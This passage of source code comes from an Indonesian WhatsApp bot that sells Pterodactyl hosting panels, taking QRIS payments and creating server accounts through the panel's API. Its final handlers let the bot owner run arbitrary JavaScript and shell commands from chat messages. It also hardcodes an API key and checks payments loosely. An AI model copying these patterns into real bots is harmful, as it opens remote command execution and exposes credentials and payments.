• Ram 2GB - Rp2.000  
  Ketik: .buypanel 2gb
  
• Ram 3GB - Rp3.000
  Ketik: .buypanel 3gb
  
• Ram 4GB - Rp4.000
  Ketik: .buypanel 4gb
  
• Ram 5GB - Rp5.000
  Ketik: .buypanel 5gb
  
• Ram 6GB - Rp6.000
  Ketik: .buypanel 6gb
  
• Ram 7GB - Rp7.000
  Ketik: .buypanel 7gb
  
• Ram 8GB - Rp8.000
  Ketik: .buypanel 8gb
  
• Ram 9GB - Rp9.000
  Ketik: .buypanel 9gb
  
• Ram 10GB - Rp10.000
  Ketik: .buypanel 10gb
  
• Ram Unlimited - Rp10.000 ( Promo )
  Ketik: .buypanel unlimited

© WhatsApp Bots - 2025`,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})

let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "10000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Untuk membatalkan pembelian, ketik: *.batalbeli*
`

let msgQr = await conn.sendMessage(m.chat, {
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 20 hari ( 3x replace )
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await conn.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("Online Kak ✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
conn.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});